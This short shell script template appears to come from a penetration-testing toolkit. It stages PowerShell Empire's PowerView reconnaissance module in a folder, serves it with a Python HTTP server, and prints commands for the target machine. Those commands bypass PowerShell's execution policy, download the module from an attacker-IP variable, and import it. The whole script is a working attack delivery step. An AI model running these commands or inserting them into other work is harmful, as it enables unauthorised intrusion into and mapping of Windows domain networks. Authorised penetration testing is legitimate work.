mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 packstation/outbound; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Preparation: powershell -ep bypass'; \
echo 'Deliver and import module: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powerview.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\powerview.ps1; Import-Module <%=$(esh variables/delivery_path_windows)%>\powerview.ps1'; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
